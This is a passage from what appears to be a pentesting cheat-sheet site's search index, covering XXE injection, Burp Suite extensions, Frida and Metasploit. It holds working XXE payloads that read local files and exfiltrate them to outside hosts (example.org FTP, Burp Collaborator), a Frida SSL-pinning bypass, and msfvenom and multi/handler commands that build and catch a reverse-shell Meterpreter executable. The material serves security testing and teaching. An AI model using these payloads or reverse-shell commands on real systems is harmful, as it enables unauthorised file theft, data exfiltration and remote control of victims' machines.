Karaf &lt;= 4.2.1</li> <li>Apache Karaf &lt;= 4.1.6</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM \"http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\"&gt; %dtd;]\n&lt;features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"&gt;\n    &lt;feature name=\"deployer\" version=\"2.0\" install=\"auto\"&gt;\n    &lt;/feature&gt;\n&lt;/features&gt;\n</code></pre> <p>Send the XML file to the <code>deploy</code> folder.</p> <p>Ref. brianwrf/CVE-2018-11788</p>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-with-local-dtd","title":"XXE with local DTD","text":"<p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:</p> <pre><code>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'&gt;]&gt;\n&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre> <p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p> <pre><code>&lt;!DOCTYPE root [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\"&gt;\n\n    %local_dtd;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n</code></pre> <p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p> <pre><code>&lt;!DOCTYPE root [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"&gt;\n\n    &lt;!ENTITY % ISOamsa '\n        &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///REPLACE_WITH_FILENAME_TO_READ\"&gt;\n        &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;\"&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n        '&gt;\n\n    %local_dtd;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n</code></pre> <p>Other payloads using different DTDs</p>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-in-exotic-files","title":"XXE in exotic files","text":""},{"location":"Pentesting/Web%20Application/xxe/#xxe-inside-svg","title":"XXE inside SVG","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"&gt;\n    &lt;image xlink:href=\"expect://ls\"&gt;&lt;/image&gt;\n&lt;/svg&gt;\n</code></pre> <p>Classic</p> <pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;\n   &lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;\n</code></pre> <p>OOB via SVG rasterization</p> <p>xxe.svg</p> <pre><code>&lt;!DOCTYPE svg [\n&lt;!ELEMENT svg ANY &gt;\n&lt;!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\"&gt;\n%sp;\n%param1;\n]&gt;\n&lt;svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\"&gt;\n      &lt;text x=\"15\" y=\"100\" style=\"fill:black\"&gt;XXE via SVG rasterization&lt;/text&gt;\n      &lt;rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/&gt;\n      &lt;flowRoot font-size=\"15\"&gt;\n         &lt;flowRegion&gt;\n           &lt;rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/&gt;\n         &lt;/flowRegion&gt;\n         &lt;flowDiv&gt;\n            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;\n         &lt;/flowDiv&gt;\n      &lt;/flowRoot&gt;\n&lt;/svg&gt;\n</code></pre> <p>xxe.xml</p> <pre><code>&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'&gt;\"&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-inside-soap","title":"XXE inside SOAP","text":"<pre><code>&lt;soap:Body&gt;\n  &lt;foo&gt;\n    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;\n  &lt;/foo&gt;\n&lt;/soap:Body&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-inside-docx-file","title":"XXE inside DOCX file","text":"<p>Format of an Open XML file (inject the payload in any .xml file):</p> <ul> <li>/_rels/.rels</li> <li>[Content_Types].xml</li> <li>Default Main Document Part</li> <li>/word/document.xml</li> <li>/ppt/presentation.xml</li> <li>/xl/workbook.xml</li> </ul> <p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p> <p>Tool : https://github.com/BuffaloWill/oxml_xxe</p> <pre><code>DOCX/XLSX/PPTX\nODT/ODG/ODP/ODS\nSVG\nXML\nPDF (experimental)\nJPG (experimental)\nGIF (experimental)\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-inside-xlsx-file","title":"XXE inside XLSX file","text":"<p>Extract the excel file.</p> <pre><code>$ mkdir XXE &amp;&amp; cd XXE\n$ unzip ../XXE.xlsx\nArchive:  ../XXE.xlsx\n  inflating: xl/drawings/drawing1.xml\n  inflating: xl/worksheets/sheet1.xml\n  inflating: xl/worksheets/_rels/sheet1.xml.rels\n  inflating: xl/sharedStrings.xml\n  inflating: xl/styles.xml\n  inflating: xl/workbook.xml\n  inflating: xl/_rels/workbook.xml.rels\n  inflating: _rels/.rels\n  inflating: [Content_Types].xml\n</code></pre> <p>Add your blind XXE payload inside <code>xl/workbook.xml</code>.</p> <pre><code>&lt;xml...&gt;\n&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \"http://YOURCOLLABORATORID.burpcollaborator.net/\"&gt; ]&gt;\n&lt;x&gt;&amp;xxe;&lt;/x&gt;\n&lt;workbook...&gt;\n</code></pre> <p>Rebuild the Excel file.</p> <pre><code>$ zip -r ../poc.xslx *\nupdating: [Content_Types].xml (deflated 71%)\nupdating: _rels/ (stored 0%)\nupdating: _rels/.rels (deflated 60%)\nupdating: docProps/ (stored 0%)\nupdating: docProps/app.xml (deflated 51%)\nupdating: docProps/core.xml (deflated 50%)\nupdating: xl/ (stored 0%)\nupdating: xl/workbook.xml (deflated 56%)\nupdating: xl/worksheets/ (stored 0%)\nupdating: xl/worksheets/sheet1.xml (deflated 53%)\nupdating: xl/styles.xml (deflated 60%)\nupdating: xl/theme/ (stored 0%)\nupdating: xl/theme/theme1.xml (deflated 80%)\nupdating: xl/_rels/ (stored 0%)\nupdating: xl/_rels/workbook.xml.rels (deflated 66%)\nupdating: xl/sharedStrings.xml (deflated 17%)\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#tools","title":"Tools","text":"<ul> <li> <p>https://www.xxe.sh/</p> </li> <li> <p>https://github.com/BuffaloWill/oxml_xxe</p> </li> <li> <p>https://github.com/enjoiz/XXEinjector/</p> </li> <li> <p>https://github.com/lc/230-OOB</p> </li> <li> <p>https://github.com/staaldraad/xxeserv</p> </li> <li> <p>https://github.com/luisfontes19/xxexploiter</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/xxe/#references","title":"References","text":"<ul> <li> <p>https://www.youtube.com/watch?v=9-3VWCyfxWU</p> </li> <li> <p>https://jagskap.blogspot.com/2019/08/</p> </li> <li> <p>https://portswigger.net/web-security/xxe</p> </li> <li> <p>https://www.synack.com/blog/a-deep-dive-into-xxe-injection/</p> </li> <li> <p>https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26</p> </li> <li> <p>https://medium.com/@klose7/xxe-attacks-part-2-xml-dtd-related-attacks-a572e8deb478</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p> </li> <li> <p>https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/</p> </li> <li> <p>https://phonexicum.github.io/infosec/xxe.html</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/xxe/#workshoplabs","title":"Workshop/labs","text":"<ul> <li>https://gosecure.github.io/xxe-workshop/#0</li> </ul>"},{"location":"Pentesting/Web%20Application/keyhacks/firebase-exploits/","title":"Firebase exploits","text":""},{"location":"Pentesting/Web%20Application/keyhacks/firebase-exploits/#firebase-exploits","title":"Firebase exploits","text":""},{"location":"Pentesting/Web%20Application/keyhacks/firebase-exploits/#what-is-firebase","title":"What is Firebase?","text":"<p>Firebase, a platform offered by Google, serves as a robust toolkit for creating web and mobile applications. It encompasses an array of services such as real-time database, authentication, hosting, cloud functions, and more, all efficiently managed in the cloud. With Firebase, developers can swiftly develop and deploy applications, free from the burdens of infrastructure management. Its popularity stems from its user-friendly interface, scalability, and seamless integration with other Google services, rendering it a preferred option for startups, enterprises, and individual developers alike.</p>"},{"location":"Pentesting/Web%20Application/keyhacks/firebase-exploits/#tools","title":"Tools","text":"<ul> <li> <p>https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit</p> </li> <li> <p>https://github.com/Turr0n/firebase</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/keyhacks/firebase-exploits/#references","title":"References","text":"<ul> <li> <p>https://medium.com/@danangtriatmaja/firebase-database-takover-b7929bbb62e1</p> </li> <li> <p>https://github.com/streaak/keyhacks#Firebase</p> </li> <li> <p>http://ghostlulz.com/google-exposed-firebase-database/</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/keyhacks/gmaps-api-scanner/","title":"Gmaps API Scanner","text":""},{"location":"Pentesting/Web%20Application/keyhacks/gmaps-api-scanner/#gmaps-api-scanner","title":"Gmaps API Scanner","text":""},{"location":"Pentesting/Web%20Application/keyhacks/gmaps-api-scanner/#what-is-gmap-api","title":"What is Gmap API?","text":"<p>The Google Maps API is a tool that developers use to integrate mapping and location-based functionalities into their applications or websites. It provides access to a wide range of services, such as displaying maps, adding markers, obtaining directions, and geocoding (converting addresses into geographic coordinates). Developers can use the API to create customized mapping solutions tailored to their specific needs, enhancing user experiences with location-based features.</p>"},{"location":"Pentesting/Web%20Application/keyhacks/gmaps-api-scanner/#tool","title":"Tool","text":"<p>Google Maps API Scanner : https://github.com/ozguralp/gmapsapiscanner</p>"},{"location":"Pentesting/Web%20Application/keyhacks/map-box-api-scanner/","title":"Map box api scanner","text":""},{"location":"Pentesting/Web%20Application/keyhacks/map-box-api-scanner/#map-box-api-scanner","title":"Map box api scanner","text":""},{"location":"Pentesting/Web%20Application/keyhacks/map-box-api-scanner/#what-is-map-box","title":"What is Map Box?","text":"<p>Mapbox is a versatile mapping platform that allows developers to integrate customizable maps and location-based services into their applications. It provides tools and APIs for creating interactive maps with various styles, layers, and data sources. Developers can utilize Mapbox to add features such as geocoding, routing, and spatial analysis to their apps. With its flexibility and extensive documentation, Mapbox serves as a powerful tool for building location-aware applications across web, mobile, and desktop platforms.</p>"},{"location":"Pentesting/Web%20Application/keyhacks/map-box-api-scanner/#tool","title":"Tool","text":"<p>Map box api scanner : https://github.com/Tink2Hack/Mapboxapiscanner</p>"},{"location":"Tools%20and%20Extensions/","title":"Tools and Extensions","text":""},{"location":"Tools%20and%20Extensions/#tools-and-extensions","title":"Tools and Extensions","text":"<ul> <li> <p> Tools Cheatsheet for Pentesting</p> <p>Explore essential pentesting tools to upgrade your cybersecurity arsenal.</p> </li> <li> <p> Burp Suite Extensions</p> <p>Explore Burp Suite extensions to optimize your penetration testing workflows.</p> </li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/authmatrix/","title":"AuthMatrix","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/authmatrix/#authmatrix","title":"AuthMatrix","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/authmatrix/#description","title":"Description","text":"<p>The AuthMatrix extension is designed for testing authorization in web applications and web services. With AuthMatrix, testers can focus on thoroughly defining tables of users, roles, and requests specific to their target application upfront. These tables are structured similarly to an access control matrix, which is common in various threat modeling methodologies.</p> <p>Once the tables are assembled, testers can use the simple click-to-run interface to initiate all combinations of roles and requests. The results are displayed in an easy-to-read, color-coded interface that indicates any authorization vulnerabilities detected in the system. Additionally, the extension provides the ability to save and load target configurations for simple regression testing.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/authmatrix/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for AuthMatrix.</li> <li>Click on Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/authmatrix/#references","title":"References","text":"<ul> <li>AuthMatrix Blog Post</li> <li>AuthMatrix GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/","title":"Flow","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/#flow","title":"Flow","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/#description","title":"Description","text":"<p>The Flow extension provides a Proxy history-like view along with search filter capabilities for all Burp Suite tools. It displays requests even without responses, updating them once a response is received.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/#note","title":"Note","text":"<p>If you are using the \"Platform Authentication\" or \"Match and Replace\" feature of Burp Suite, Flow may not match responses to related requests.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for Flow.</li> <li>Click on Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/flow/#references","title":"References","text":"<ul> <li>Flow GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/","title":"HTTP Request Smuggler","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/#http-request-smuggler","title":"HTTP Request Smuggler","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/#description","title":"Description","text":"<p>The HTTP Request Smuggler is a go-to Burp extension that allows you to easily detect and exploit web applications for HTTP Request Smuggling. It detects conditions such as CL.TE or TE.CL and reports them directly to Burp Suite\u2019s Dashboard tab, under the Issue Activity menu where all issues are listed.</p> <p>To use the HTTP Request Smuggler extension, you first need to install the Turbo Intruder extension, which sends a large number of requests to analyze the result.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/#steps-to-install-turbo-intruder","title":"Steps to Install Turbo Intruder","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for Turbo Intruder.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/#steps-to-install-http-request-smuggler","title":"Steps to Install HTTP Request Smuggler","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for HTTP Request Smuggler.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/http-request-smuggler/#references","title":"References","text":"<ul> <li>Turbo Intruder GitHub Repository</li> <li>HTTP Request Smuggler GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/java-deserialize-scanner/","title":"Java Deserialize Scanner","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/java-deserialize-scanner/#java-deserialize-scanner","title":"Java Deserialize Scanner","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/java-deserialize-scanner/#description","title":"Description","text":"<p>The Java Deserialization Scanner extension is used to detect and exploit Java deserialization vulnerabilities.</p> <p>This extension can be used by integrating with Burp Suite's active and passive scanner. The Java Deserialization Scanner extension utilizes custom payloads generated by ysoserial tool. </p> <p>The Passive Java Deserialization Scanner checks for serialized Java objects in the HTTP request, while the Active Java Deserialization Scanner checks for weak deserialization functions in conjunction with weak libraries like:</p> <ol> <li>Apache Commons Collections 3 (up to 3.2.1), with five different chains</li> <li>Apache Commons Collections 4 (up to 4.4.0), with two different chains</li> <li>Spring (up to 4.2.2), with two different chains</li> <li>Java 6 and Java 7 (up to Jdk7u21) without any weak library</li> <li>Hibernate 5</li> <li>JSON</li> <li>Rome</li> <li>Java 8 (up to Jdk8u20) without any weak library</li> <li>Apache Commons BeanUtils</li> <li>Javassist/Weld</li> <li>JBoss Interceptors</li> <li>Mozilla Rhino (two different chains)</li> <li>Vaadin</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/java-deserialize-scanner/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for Java Deserialize Scanner.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/java-deserialize-scanner/#references","title":"References","text":"<ul> <li>Java Deserialization Scanner GitHub Repository</li> <li>Java Deserialization Scanner on PortSwigger BApp Store</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-js-beautifier/","title":"JSON/JS-Beautifier","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-js-beautifier/#jsonjs-beautifier","title":"JSON/JS-Beautifier","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-js-beautifier/#description","title":"Description","text":"<p>The JSON/JS-Beautifier extension is used to modify JSON and JavaScript output to make the body parameters human-readable.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-js-beautifier/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Download the Jython jar file from https://www.jython.org/download.</li> <li>Start Burp Suite.</li> <li>Go to the Extender tab.</li> <li>Navigate to the Options tab.</li> <li>Install the packages <code>jsbeautifier</code> and <code>six</code> using pip install (Jython pip install).</li> <li>In the Python environment, click on the select file option and upload the downloaded jar file.</li> <li>Specify the folder (for Windows - C:\\jython2.7\\lib\\site-packages or for Linux /opt/jython/Lib/site-packages), then select the folder option.</li> <li>Download the JSBeautifier file from https://github.com/PortSwigger/json-js-beautifier/blob/master/JSBeautifier.py.</li> <li>Go to the Extension Tab, click on Add option, and select the file.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-js-beautifier/#references","title":"References","text":"<ul> <li>JSON Beautifier GitHub Repository</li> <li>JSON/JS-Beautifier GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/","title":"JSON Web Tokens (JWT4B)","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/#json-web-tokens-jwt4b","title":"JSON Web Tokens (JWT4B)","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/#description","title":"Description","text":"<p>JSON Web Tokens (JWT4B) is used to decode and manipulate JSON web tokens on the fly, checking for their validity and automating common attacks.</p> <p>Features of JWT4B: - Automatic recognition - JWT Editor - Resigning of JWTs - Signature checks - Automated attacks such as \"Alg None\" &amp; \"CVE-2018-0114\" - Validity checks and support for 'expires', 'not before', 'issued at' fields in the payload - Automatic tests for security flags in cookie-transmitted JWTs</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for JSON Web Tokens.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/#build-your-own-version-with-eclipse","title":"Build Your Own Version with Eclipse","text":"<ol> <li>Clone this repository: https://github.com/PortSwigger/json-web-tokens and create a new Eclipse Java project.</li> <li>Right-click, go to configure, and click on \"Convert to Maven Project.\"</li> <li>Open Burp Suite, go to Extender.</li> <li>Go to APIs and click on \"Save files interface\". Copy all files to <code>JWT4B\\src\\burp</code>.</li> <li>Export a runnable fat JAR including libraries.</li> <li>Load the JAR in Burp through the Extender Tab -&gt; Extensions -&gt; Click Add.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/json-web-tokens-jwt4b/#reference","title":"Reference","text":"<ul> <li>JWT4B GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/","title":"SAML Raider","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#saml-raider","title":"SAML Raider","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#description","title":"Description","text":"<p>SAML Raider is an extension used for testing SAML infrastructures. It offers two core functionalities: Manipulating SAML Messages and managing X.509 certificates.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#message-editor-features","title":"Message Editor Features:","text":"<ul> <li>Sign SAML messages &amp; assertions (signature spoofing attack)</li> <li>Remove signatures (signature exclusion attack)</li> <li>Edit SAML messages (SAMLRequest, SAMLResponse &amp; custom parameter names)</li> <li>Perform eight common XSW attacks</li> <li>Insert XXE and XSLT attack payloads</li> <li>Supported Profiles: SAML Web Browser Single Sign-on Profile, Web Services Security SAML Token Profile</li> <li>Supported Bindings: POST Binding, Redirect Binding, SOAP Binding, URI Binding</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#certificate-manager-features","title":"Certificate Manager Features:","text":"<ul> <li>Import X.509 certificates (PEM and DER format)</li> <li>Import X.509 certificate chains</li> <li>Export X.509 certificates (PEM format)</li> <li>Delete imported X.509 certificates</li> <li>Display information of X.509 certificates</li> <li>Import private keys (PKCD#8 in DER format and traditional RSA in PEM Format)</li> <li>Export private keys (traditional RSA Key PEM Format)</li> <li>Cloning X.509 certificates and certificate chains</li> <li>Create new X.509 certificates</li> <li>Editing and self-signing existing X.509 certificates</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for SAML Raider.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/saml-raider/#references","title":"References","text":"<ul> <li>SAML Raider GitHub Repository</li> <li>Compass Security Blog Post on SAML Burp Extension</li> </ul>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/wsdler-for-soap-services/","title":"wsdler For SOAP Services","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/wsdler-for-soap-services/#wsdler-for-soap-services","title":"wsdler For SOAP Services","text":""},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/wsdler-for-soap-services/#description","title":"Description","text":"<p>The wsdler extension is convenient for pentesting SOAP services that expose WSDL files. It eliminates the need to load the WSDL file in SoapUI and manually hit each SOAP endpoint with Burp as a proxy.</p>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/wsdler-for-soap-services/#steps-to-install","title":"Steps to Install","text":"<ol> <li>Start Burp Suite.</li> <li>Navigate to the Extender tab.</li> <li>Visit the BApp Store.</li> <li>Search for wsdler.</li> <li>Click Install.</li> </ol>"},{"location":"Tools%20and%20Extensions/Burp%20Suite%20Extensions/wsdler-for-soap-services/#references","title":"References","text":"<ul> <li>wsdler on PortSwigger BApp Store</li> <li>wsdler GitHub Repository</li> </ul>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/frida/","title":"Frida","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/frida/#frida","title":"Frida","text":"<p>1. Understanding the Target: Before using Frida, you need to understand the target application or process you want to instrument. Identify the functions, APIs, or behaviors you want to intercept or modify.</p> <p>2. Installation</p> <ul> <li>Install Frida tools on your development machine (laptop/PC) using pip:     <pre><code>pip install frida-tools\n</code></pre></li> <li>Install Frida server on the target device (Android in this case):<ul> <li>Determine the device architecture (arm/arm64/x86/x86_64) using: <pre><code>adb shell getprop | grep abi\n</code></pre></li> <li>Download the compatible Frida server from the official repository: Frida Releases</li> <li>Extract the downloaded archive and navigate to the directory.</li> <li>Push Frida server to the device: <pre><code>adb push frida-server /data/local/tmp\n</code></pre></li> <li>Enter ADB shell and navigate to the directory: <pre><code>adb shell\ncd /data/local/tmp\n</code></pre></li> <li>Provide executable permissions to Frida server: <pre><code>chmod 777 frida-server\n</code></pre></li> <li>Start Frida server: <code>./frida-server</code></li> </ul> </li> </ul> <p>3. Instrumentation</p> <ul> <li> <p>Launch the target application on the device.</p> </li> <li> <p>Write Frida scripts (JavaScript) to define hooks or modifications.</p> </li> <li> <p>Run the Frida CLI or scripts using Frida tools to inject instrumentation into the target process.</p> </li> </ul> <p>4. Example Usage:</p> <ul> <li>Spy on Crypto APIs:      <pre><code>Java.perform(function () {\n    var Crypto = Java.use('javax.crypto.Cipher');\n    Crypto.doFinal.overload('[B').implementation = function (data) {\n        console.log(\"doFinal intercepted with data: \" + data);\n        return this.doFinal(data);\n    };\n});\n</code></pre></li> <li>Bypass SSL Pinning:      <pre><code>Java.perform(function () {\n    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');\n    TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        // bypassing SSL pinning\n        return;\n    };\n});\n</code></pre></li> </ul> <p>5. Execution:</p> <ul> <li>Run Frida scripts against the target application:      <pre><code>frida -U -f &lt;package_name&gt; -l &lt;script.js&gt; --no-pause\n</code></pre>      Replace <code>&lt;package_name&gt;</code> with the target application's package name and <code>&lt;script.js&gt;</code> with the path to your Frida script.</li> </ul> <p>6. Verification: Monitor the output of Frida scripts to verify that hooks are functioning as expected. You can observe logs or interactions as defined in your Frida scripts.</p> <p>7. Cleanup: After testing, make sure to stop Frida server on the device and remove the injected instrumentation from the target process.</p>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/metasploit/","title":"Metasploit Commands","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/metasploit/#metasploit-commands","title":"Metasploit Commands","text":"<p>To Display All Exploits Related to a Specific Vulnerability </p><pre><code>search exploit &lt;vulnerability&gt;\n</code></pre> <p>To Choose a Specific Exploit for Use </p><pre><code>use exploit/&lt;exploit_name&gt;\n</code></pre> <p>To Review Current Configuration Settings of the Selected Exploit </p><pre><code>options\n</code></pre> <p>To List Payloads Compatible With the Chosen Exploit </p><pre><code>show payloads\n</code></pre> <p>To Assign a Specific Payload to the Current Exploit </p><pre><code>set PAYLOAD &lt;payload_name&gt;\n</code></pre> <p>To Configure an Option for the Active Exploit or Payload </p><pre><code>set &lt;option_name&gt; &lt;value&gt;\n</code></pre> <p>To Execute the Configured Exploit </p><pre><code>run\n</code></pre> or <pre><code>exploit\n</code></pre> <p>Command to Generate a Windows Payload in One Line </p><pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=&lt;listening_host&gt; LPORT=&lt;listening_port&gt; -b \"\\x00\" -e x86/shikata_ga_nai -i 10 -f exe -o /path/to/payload.exe\n</code></pre> <p>One-Line Command to Initiate a Meterpreter Session </p><pre><code>msfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST &lt;listening_host&gt;; set LPORT &lt;listening_port&gt;; exploit;\"\n</code></pre> <p>Additional Commands for Enhanced Metasploit Usage</p> <p>To Display Information About a Specific Module </p><pre><code>info\n</code></pre> <p>To Set Up a Multi-Handler for Receiving Reverse Connections </p><pre><code>use exploit/multi/handler\n</code></pre> <p>To Save the Current Configuration to a File for Later Use </p><pre><code>save\n</code></pre> <p>To Load a Previously Saved Configuration </p><pre><code>load &lt;file_name&gt;\n</code></pre> <p>To Background a Current Session Without Closing It </p><pre><code>background\n</code></pre> <p>To List All Active Sessions </p><pre><code>sessions\n</code></pre> <p>To Interact With a Specific Meterpreter Session </p><pre><code>sessions -i &lt;session_number&gt;\n</code></pre> <p>To Display the Metasploit Version and Environment Information </p><pre><code>version\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/mobile-security-framework-mobsf/","title":"Mobile Security Framework 